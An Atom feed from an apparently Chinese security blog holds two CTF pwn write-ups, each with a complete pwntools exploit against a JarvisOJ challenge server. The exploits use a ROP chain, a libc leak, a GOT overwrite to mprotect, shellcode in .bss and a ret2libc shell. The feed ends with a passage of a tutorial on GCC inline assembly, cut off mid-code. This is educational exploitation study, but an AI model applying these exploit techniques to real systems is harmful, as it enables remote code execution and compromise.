<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ScUpax0s</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-30T10:39:14.907Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Paxos</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>从一道经典的x64pwn学习mprotect与GOT表覆写</title>
    <link href="http://yoursite.com/2020/04/30/%E4%BB%8E%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84x64pwn%E5%AD%A6%E4%B9%A0mprotect%E4%B8%8EGOT%E8%A1%A8%E8%A6%86%E5%86%99/"/>
    <id>http://yoursite.com/2020/04/30/从一道经典的x64pwn学习mprotect与GOT表覆写/</id>
    <published>2020-04-30T08:38:37.000Z</published>
    <updated>2020-04-30T10:39:14.907Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在前面（考察知识点）"><a href="#写在前面（考察知识点）" class="headerlink" title="写在前面（考察知识点）"></a>写在前面（考察知识点）</h2><ul><li>x64通用ROPgadget构造传参</li><li>libc_base地址计算</li><li>mprotect函数基本用法（.bss段权限调整）</li><li>GOT表覆写</li><li>shellcode注入.bss段</li></ul><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><ul><li>给出了一个64为可执行程序和一个相应的libc</li><li>system、exec函数族函数被禁用（实际没有，但是题目要求我们按照禁用的做，不可使用system和exec族函数）</li><li>没有可使用的现成的shellcode（需要自己注入进去shellcode）</li><li>bss段<strong>没有可执行权限</strong>，要用mprotect去改</li></ul><h2 id="开始pwn"><a href="#开始pwn" class="headerlink" title="开始pwn"></a>开始pwn</h2><p><strong>1.主体程序分析：</strong><br><img src="https://s1.ax1x.com/2020/04/30/Jqsuc9.png" alt="a"><br>一个典型的栈溢出：分配了0x80，读进去200，不过这道题难点不在这里，难点在于，禁用system，exec函数族，没有shellcode。。（啥都没有）我们要想方设法重复利用这个栈溢出去达到我们的目的。<br><img src="https://s1.ax1x.com/2020/04/30/JqshBq.png" alt="b"><br>看一些GOT表里面的函数，我们覆写的时候要选择能用的。<br><strong>2.整体思路过程</strong></p><ul><li><p>首先我们这道题要重复使用x64下的基于__libc_csu_init(),这个函数实际上是程序的一个构造函数（当然有构造函数也有对应的析构函数）详情看(虽然是x86的，但也可以借鉴)<a href="https://luomuxiaoxiao.com/?p=516" target="_blank" rel="noopener">Linux X86 程序启动 – main函数是如何被执行的？</a><br>这是万能ROPgadget本体：<br><img src="https://s1.ax1x.com/2020/04/30/JqWbon.png" alt=""><br>我们将它分为三部分看：<br>（1）<strong>0x4006aa到0x4006b4</strong><br> 在这一部分，我们将栈中的值pop到rbx、rbp、r12、r13、r14、r15，也就是说，如果我们提前在栈上布置好，就可以把值送入这些寄存器，已被后续使用。</p><p>  （2）<strong>0x400690到0x400699</strong><br>  在这一部分，我们将r13，r14，r15d分别送入rdx，rdi，edi（rdi的低位），而在x64传参数的时候，前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。这是与x86很不一样的一点。<a href="https://www.ituring.com.cn/article/216561" target="_blank" rel="noopener">记一次linux x64 的栈溢出</a>，也就是说，在这一部分，我们可以完成前三个参数的传递，这样我们进入函数的基础就有了，接下来<code>0x0000000000400699 &lt;+73&gt;:    call   QWORD PTR [r12+rbx*8]</code>这里会帮助我们跳转到我们要执行的函数，这样就完成了一次劫持，不过要注意的是：r12并不是我们目标函数的地址，准确的来说，我们要将目标函数（或shellcode）覆写GOT表中（替换一个got表中已有的函数），然后通过跳转进入相应的GOT表中的表项来达到执行目标函数的目的！（这里一开始踩坑了。。）</p><p>  （3）<strong>0x40069d到0x4006a4</strong><br>   在这里，给rbx+1，然后判断rbx和rbp大小， 我们想要顺利通过这里，不被<code>0x00000000004006a4 &lt;+84&gt;:    jne    0x400690 &lt;__libc_csu_init+64&gt;</code>循环卡死，所以在一开始设置rbx=0；rbp=1，就可以顺利通过这里。</p></li></ul><p><strong>不过很重要的一点！在完成整个ROPgadget的时候，最后一定要加上cyclic（0x38）来补位！，原因在于，当你执行这个gadget，实际上他不是按照正常流程执行的，0x4006aa到0x4006b4 这一段pop；ret的过程执行了两次，导致整个栈被抬高了 7*8=56个bytes，所以要做一个补位，才能达到真正的返回地址</strong>  </p><ul><li><p>给出我们的x64ROPgadget函数，把它写成一个函数，我们要多次利用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_x64rop</span><span class="params">(func_got,arg1,arg2,arg3,returnData=False)</span>:</span></span><br><span class="line">    payload = flat(</span><br><span class="line">    cyclic(<span class="number">0x88</span>),   <span class="comment"># 溢出</span></span><br><span class="line">    p64(pop7ret),   </span><br><span class="line">    p64(<span class="number">0</span>),         </span><br><span class="line">    p64(<span class="number">1</span>),         <span class="comment"># rbp于rbx初始化</span></span><br><span class="line">    p64(func_got),  <span class="comment"># 我们要到达的目标函数的GOT位置</span></span><br><span class="line">    p64(arg3),</span><br><span class="line">    p64(arg2),</span><br><span class="line">    p64(arg1),      <span class="comment"># 参数准备</span></span><br><span class="line">    p64(mov3call),  <span class="comment"># 参数准备2</span></span><br><span class="line">    cyclic(<span class="number">0x38</span>),   <span class="comment"># 7*8补位</span></span><br><span class="line">    p64(vul_func_addr)  <span class="comment"># 返回地址</span></span><br><span class="line">    )</span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> returnData == <span class="literal">True</span>:</span><br><span class="line">        Data = u64(io.recv(<span class="number">8</span>))   <span class="comment"># 需要leak地址时设为true</span></span><br><span class="line">        <span class="keyword">return</span> Data</span><br></pre></td></tr></table></figure></li><li><p>然后使用我们构造好的函数，首先leak出libc_base，拿到mprotect的真实地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc_base = _x64rop(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,<span class="literal">True</span>)-libc.sym[<span class="string">'write'</span>]</span><br><span class="line">mprotect = libc.sym[<span class="string">'mprotect'</span>]+libc_base</span><br><span class="line">log.success(<span class="string">"mprotect :%s"</span>%hex(mprotect))</span><br></pre></td></tr></table></figure></li><li><p>接下来，由于我们没有shellcode，我们需要手动读进来shellcode，然后放到bss段上，这里我们的func_got是read，然后第一个参数为0，代表stdin，bss_addr代表我们要向bss段读，然后读取生成的len(shellcode)个字节。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">_x64rop(read_got,<span class="number">0</span>,bss_addr,len(shellcode)) <span class="comment"># 将shellcode用read读入bss段</span></span><br><span class="line">io.send(shellcode)</span><br></pre></td></tr></table></figure></li><li><p>好了，现在我们有了shellcod了，但问题来了，看一下bss段的权限<br><img src="https://s1.ax1x.com/2020/04/30/Jq70Df.png" alt=""><br><img src="https://s1.ax1x.com/2020/04/30/Jq7lDK.png" alt=""><br>尴尬，bss段压根没有可执行权限啊。。好了，那我们需要用mprotect来手动改掉他的权限。</p></li></ul><ul><li><p>现在我们需要将bss段权限改掉，加上可执行权限。不过在这之前，我们还要做一件事情，我们需要将mprotect函数写进GOT表，替换掉一个got表中原有的函数（偷天换日），这样才能成功的调用mprotect来修改权限。这里我们使用read函数来读入，调用read_got，stdin，向本来存<code>__libc_start_main</code>的got位置，写进去8个字节，也就是把这个位置覆写掉，然后我们在<code>io.send(p64(mprotect))</code>向他发送mprotect的地址，此时read把这个mprotect的地址就读进去了。ok！覆写GOT成功。此时可以通过跳转到<code>__libc_start_main</code>来调用mprotect了。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_x64rop(read_got,<span class="number">0</span>,main_got,<span class="number">8</span>)              <span class="comment"># 用read在got表中main的地方覆盖为mprotect的地址，成功后可以通过got表调用mprotect</span></span><br><span class="line">io.send(p64(mprotect))</span><br></pre></td></tr></table></figure></li><li><p>接下来我们修改bss段为可执行权限。我们向__libc_start_main跳转，由于此时这个函数已经被覆写，实际我们跳转的位置是mprotect，OK，我们修改0x00600000起始，0x1000个字节地址权限为0x7（可执行），<strong>注意，这里一定是0x00600000开始，因为mprotect在修改时会做页对齐，如果我们不从一个对齐的位置修改，是达不到目的的。</strong><a href="https://blog.csdn.net/roland_sun/article/details/33728955" target="_blank" rel="noopener">关于mprotect</a></p></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x64rop(main_got,<span class="number">0x00600000</span>,<span class="number">0x1000</span>,<span class="number">0x7</span>)     <span class="comment"># 修改bss段权限为可执行</span></span><br></pre></td></tr></table></figure><ul><li>好了！所有准备工作完毕，现在开始pwn！其实这里很简单,我们再做一次溢出然后直接跳到bss_addr的位置，也就是我们放shellcode的位置，因为此时bss段已经变为可执行的，那么程序会自动执行这个段上的内容。<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(cyclic(<span class="number">0x88</span>),p64(bss_addr))       <span class="comment"># 直接跳到bss执行shellcode</span></span><br><span class="line">io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="最终exp与结果"><a href="#最终exp与结果" class="headerlink" title="最终exp与结果"></a>最终exp与结果</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">pop7ret = <span class="number">0x00000000004006aa</span></span><br><span class="line">mov3call = <span class="number">0x0000000000400690</span></span><br><span class="line">vul_func_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_x64rop</span><span class="params">(func_got,arg1,arg2,arg3,returnData=False)</span>:</span></span><br><span class="line">    payload = flat(</span><br><span class="line">    cyclic(<span class="number">0x88</span>),   <span class="comment"># 溢出</span></span><br><span class="line">    p64(pop7ret),   </span><br><span class="line">    p64(<span class="number">0</span>),         </span><br><span class="line">    p64(<span class="number">1</span>),         <span class="comment"># rbp于rbx初始化</span></span><br><span class="line">    p64(func_got),  <span class="comment"># 我们要到达的目标函数的GOT位置</span></span><br><span class="line">    p64(arg3),</span><br><span class="line">    p64(arg2),</span><br><span class="line">    p64(arg1),      <span class="comment"># 参数准备</span></span><br><span class="line">    p64(mov3call),  <span class="comment"># 参数准备2</span></span><br><span class="line">    cyclic(<span class="number">0x38</span>),   <span class="comment"># 7*8补位</span></span><br><span class="line">    p64(vul_func_addr)  <span class="comment"># 返回地址</span></span><br><span class="line">    )</span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> returnData == <span class="literal">True</span>:</span><br><span class="line">        Data = u64(io.recv(<span class="number">8</span>))   <span class="comment"># 需要leak地址时设为true</span></span><br><span class="line">        <span class="keyword">return</span> Data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'0'</span>:</span><br><span class="line">    io = process(<span class="string">"./level3_x64"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>: <span class="string">"./libc-2.19.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9884</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    libc_base = _x64rop(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,<span class="literal">True</span>)-libc.sym[<span class="string">'write'</span>]   <span class="comment"># leak基址</span></span><br><span class="line">    mprotect = libc.sym[<span class="string">'mprotect'</span>]+libc_base</span><br><span class="line">    log.success(<span class="string">"mprotect :%s"</span>%hex(mprotect))</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    _x64rop(read_got,<span class="number">0</span>,bss_addr,len(shellcode)) <span class="comment"># 将shellcode用read读入bss段</span></span><br><span class="line">    io.send(shellcode)</span><br><span class="line"></span><br><span class="line">    _x64rop(read_got,<span class="number">0</span>,main_got,<span class="number">8</span>)              <span class="comment"># 用read在got表中main的地方覆盖为mprotect的地址，成功后可以通过got表调用mprotect</span></span><br><span class="line">    io.send(p64(mprotect))</span><br><span class="line"></span><br><span class="line">    _x64rop(main_got,<span class="number">0x00600000</span>,<span class="number">0x1000</span>,<span class="number">0x7</span>)     <span class="comment"># 修改bss段权限为可执行</span></span><br><span class="line"></span><br><span class="line">    payload = flat(cyclic(<span class="number">0x88</span>),p64(bss_addr))       <span class="comment"># 直接跳到bss执行shellcode</span></span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/30/JqLnIO.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;写在前面（考察知识点）&quot;&gt;&lt;a href=&quot;#写在前面（考察知识点）&quot; class=&quot;headerlink&quot; title=&quot;写在前面（考察知识点）&quot;&gt;&lt;/a&gt;写在前面（考察知识点）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;x64通用ROPgadget构造传参&lt;/li&gt;
&lt;li&gt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>一道经典的ret2lib</title>
    <link href="http://yoursite.com/2020/04/25/%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84ret2lib/"/>
    <id>http://yoursite.com/2020/04/25/一道经典的ret2lib/</id>
    <published>2020-04-25T04:20:34.000Z</published>
    <updated>2020-04-25T04:19:59.199Z</updated>
    
    <content type="html"><![CDATA[<p><del>最近心血来潮突然想整理一道经典的ret2libc</del>  </p><p><strong>废话不多说，直接开始</strong></p><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>在gdb中disas我们会看到这样一项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 0x8048340 &lt;write@plt&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/25/JsmSVH.png" alt="avater"><br>这个<code>&lt;write@plt&gt;</code>实际并不是write的地址，只是一个过度的地址，这一项指向write在plt(Procedure Linkage Table)表中的地址，然后从plt表跳到got(Global Offset Table)表，最后在got表中的某一项拿到write的真正地址。这是一个多次跳转的过程。这是linux自身的一个运行时重定位的机制，简要来说，有一部分函数是在glibc中的。当程序启动后，glibc装载，而些需要的函数，在运行前实际上我们是不知道他的地址的，只有当真正运行起来，调用的时候才知道他真正的地址。<br>但这个时候又出现了一个问题，为什么我们不直接在运行时把<code>&lt;write@plt&gt;</code>替换成真正的write的地址呢，而是通过多次跳转找到真正的地址？这是因为，在现代操作系统中</p><ul><li>不允许修改代码段，只能修改数据段</li><li>如果write函数是在一个动态库（.so对象）内，修改了代码段，那么它就无法做到系统内所有进程共享同一个动态库。</li></ul><p>基于这些问题，<strong>write的地址只能回写到数据段内，而不能回写在代码段上</strong>，所以我们引入got和plt表的原因就很清楚了：</p><ul><li>plt表存放一小段额外的代码，他的任务是向got表中函数对应的表项跳转以获取数据段存放的函数地址。</li><li>got表可以看作一个存放函数地址的数据表，其中对应的表项存的是函数加载后真正的地址。请看简化后的图片：<br><img src="https://s1.ax1x.com/2020/04/25/JsKkxx.png" alt="avater2"><br>通过这个过程，我们就可以leak出函数真正的地址，然后加以利用。<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><img src="https://s1.ax1x.com/2020/04/25/JsQqGd.png" alt="avater4"><br>这个函数中调用了_read我们跟进去看一下<br><img src="https://s1.ax1x.com/2020/04/25/JslfYQ.png" alt="a"><br>我们最终到达了got表中的一个位置，这里解释一下<em>为什么有一个.got一个.got.plt</em></li><li>ELF将GOT拆分为两个表，”.got”和”.got.plt”。其中”.got”用来保存全局变量引用的地址，“.got.plt”用来保存函数引用的地址，对于外部函数的引用全部放在”.got.plt”中。</li></ul><p>也就是说这个<code>dd offset read</code> 才是我们最终要到达的地址。其他函数同理。<br>当你再一次进入got中的read，达到了这样一个地方：<br><img src="https://s1.ax1x.com/2020/04/25/Js1tcn.png" alt="b"><br>这里就是真正的read的地址了。<br><em>需要注意的是，当你的函数第一次被调用时，会先将真实地址写入GOT表，然后直接跳转到真实的地址执行。而当你接下来再次进行调用时就是按照：func@plt –&gt; func@got –&gt; func跳转了</em></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="程序概览"><a href="#程序概览" class="headerlink" title="程序概览"></a>程序概览</h3><ul><li>没有给我们bin/sh</li><li>没有给我们system或exec族函数等</li><li>提供so文件</li><li>有明显的栈溢出漏洞<br><img src="https://s1.ax1x.com/2020/04/25/JsMS6P.png" alt="avater3"><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3></li><li>从libc中拿到system和bin/sh的真实地址然后pwn<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">劫持read函数 ---&gt; </span><br><span class="line">返回write函数 ---&gt; </span><br><span class="line">设置write函数返回地址为vulnerable_function ---&gt; </span><br><span class="line">fd设1，标准输出 ---&gt; buff指向read函数在got表中的真正位置 ---&gt; </span><br><span class="line">泄漏read函数的真实地址 ---&gt;  </span><br><span class="line">计算read函数与libc中read的offset ---&gt; </span><br><span class="line">加上offset拿到真实的system函数地址和&#x2F;bin&#x2F;sh的地址 ---&gt; </span><br><span class="line">二次rop，再次劫持read ---&gt; </span><br><span class="line">返回到system函数 ---&gt; </span><br><span class="line">填充垃圾返回地址 ---&gt; 参数为bin&#x2F;sh的真实地址 ---&gt; pwn</span><br></pre></td></tr></table></figure></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'0'</span>:</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">    io = process(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9879</span>)</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   <span class="comment"># pattern = 'A'*(0x88+4)</span></span><br><span class="line">    write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write@plt: "</span>,hex(write_plt)</span><br><span class="line">    read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">    vulnerable = elf.symbols[<span class="string">'vulnerable_function'</span>]   <span class="comment"># 0x804844b</span></span><br><span class="line">    return_add = vulnerable</span><br><span class="line">    payload_leak = flat(cyclic(<span class="number">0x88</span>+<span class="number">4</span>),p32(write_plt),p32(return_add),p32(<span class="number">1</span>),p32(read_got),p32(<span class="number">0x4</span>))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">    io.send(payload_leak)</span><br><span class="line">    read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"real read_addr: "</span>,hex(read_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    offset = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">    system_addr = offset +  libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = offset + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"offset: "</span>,hex(offset)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"real system: "</span>,hex(system_addr)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"read string: "</span>,hex(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">    rop = flat(</span><br><span class="line">                cyclic(<span class="number">0x88</span>+<span class="number">4</span>),p32(system_addr),cyclic(<span class="number">4</span>),p32(bin_sh_addr)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">"Input:\n"</span>, rop)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="https://s1.ax1x.com/2020/04/25/JsJ1rn.png" alt="a"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;del&gt;最近心血来潮突然想整理一道经典的ret2libc&lt;/del&gt;  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;废话不多说，直接开始&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;预备知识&quot;&gt;&lt;a href=&quot;#预备知识&quot; class=&quot;headerlink&quot; title=&quot;预备知识
      
    
    </summary>
    
      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>从一次偷懒学习内联汇编</title>
    <link href="http://yoursite.com/2020/04/03/%E4%BB%8E%E4%B8%80%E6%AC%A1%E5%81%B7%E6%87%92%E5%AD%A6%E4%B9%A0%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"/>
    <id>http://yoursite.com/2020/04/03/从一次偷懒学习内联汇编/</id>
    <published>2020-04-02T17:15:34.000Z</published>
    <updated>2020-04-03T02:51:46.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从一次偷懒学习内联汇编"><a href="#从一次偷懒学习内联汇编" class="headerlink" title="从一次偷懒学习内联汇编"></a>从一次偷懒学习内联汇编</h1><ul><li>上一节汇编语言课上，老师让写出两个数做加法，最终PSW各个标志位，于是就想能不能偷个懒，写一段程序来自动输出PSW</li><li>环境：MacOS 10.15/gcc</li></ul><h2 id="一-基本格式"><a href="#一-基本格式" class="headerlink" title="一.基本格式"></a>一.基本格式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span> [<span class="keyword">volatile</span>] ( Assembler Template</span><br><span class="line"></span><br><span class="line">                : Output Operands   <span class="comment">/* Optional */</span></span><br><span class="line">                : Input Operands    <span class="comment">/* Optional */</span></span><br><span class="line">                : Clobbers          <span class="comment">/* Optional */</span></span><br><span class="line">   )</span><br></pre></td></tr></table></figure><h2 id="Overall"><a href="#Overall" class="headerlink" title="Overall"></a>Overall</h2><p>在基本的内联汇编中，我们只有指令。但是当我们想进行更高级的操作比如：使用一些已经定义好的变量、输入一些指定的寄存器、或者输出到某些指定的寄存器，扩展内联汇编可以极大的简化我们的工作。（虽然他看起来有些晦涩</p><h3 id="一些解释"><a href="#一些解释" class="headerlink" title="一些解释"></a>一些解释</h3><ul><li>asm代表开始程序，<strong>volatile</strong>是一个可选参数，他告诉编译器：“你不要乱动我这里的代码啊！”防止由于gcc自身的优化而导致代码移动或改变位置等。( )中是我们具体的代码，其中：数字加%表示寄存器样板操作数，如：%1 换句话说，就是给寄存器起一个别名，这个别名是自然数标识的，最大到几取决于通用寄存器的数量。而我们在使用具体的寄存器时，格式为：%%寄存器，如 %%rax</li><li>Output Operands这一部分是指定输出的，比如输出到我们指定的变量中。当然了，输出部分要符合一定的约束或者格式：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:<span class="string">"=r"</span> (__var)</span><br></pre></td></tr></table></figure> 这算是比较常见的一种格式。”=r” 代表目标操作数即 %0 它可以是任意一个通用寄存器，%0是他的别名，并且变量__var 放在这个寄存器中。当然了我们的约束不仅有”=r”一种，<strong>其中，=是约束符号：只能写入，r代表约束代码：使用任何可用的通用寄存器</strong>，下面是一些总结。应当说明的是，这些约束的方式或写法仍然适合<em>Input Operands</em><br> <img src="https://s1.ax1x.com/2020/04/03/Gtorgs.png" alt="avatar"><br> <img src="https://s1.ax1x.com/2020/04/03/GtocD0.png" alt="avatar2"></li><li>Clobbers告诉系统：“我要修改、破坏某个寄存器的值，你不要乱用它”，如：%eax告诉GCC %eax的值将会在“asm”里被修改，所以GCC不会使用这个寄存器去存储其它的数值。</li></ul><h3 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span 